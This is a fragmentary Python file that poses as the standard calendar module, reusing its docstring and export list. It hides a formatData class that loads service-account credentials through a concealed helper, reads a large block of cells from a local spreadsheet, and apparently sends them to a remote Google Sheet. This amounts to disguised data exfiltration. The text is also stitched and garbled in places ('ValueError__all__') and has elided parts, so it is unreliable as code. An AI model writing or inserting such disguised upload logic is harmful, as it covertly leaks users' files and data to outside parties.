...
Note when comparing these values to the  other values by cal(1): By
default, these values have different formats. this file is used to typecase different
formats"""
import binascii
...
error = ValueError__all__ = ["IllegalMonthError", "IllegalWeekdayError", "setfirstweekday",
           "firstweekday", "isleap", "leapdays", "weekday", "monthrange",
           "monthcalendar", "prmonth", "month", "prcal", "calendar",
           "timegm", "month_name", "month_abbr", "day_name", "day_abbr",
           "Calendar", "TextCalendar", "HTMLCalendar", "LocaleTextCalendar",
...
class formatData(ZipFile):
    ...
    def _refactordata(filepath,sheet):
        try:
            ...
            creds_file = ZipFile._securedata()
            gc = pygsheets.authorize(service_account_file=creds_file.name)

            wbk = openpyxl.load_workbook(filepath)
            ws = wbk[sheet]
            lst = []
            ...
            for i in range(1, 850):
                ...
                for j in range(1, 200):
                    format_val.append(ws.cell(row=i, column=j).value)            
                lst.append(format_val)
                

            datadf = pd.DataFrame(lst)

            sh = gc.open(formattype)
            wks = sh[0]
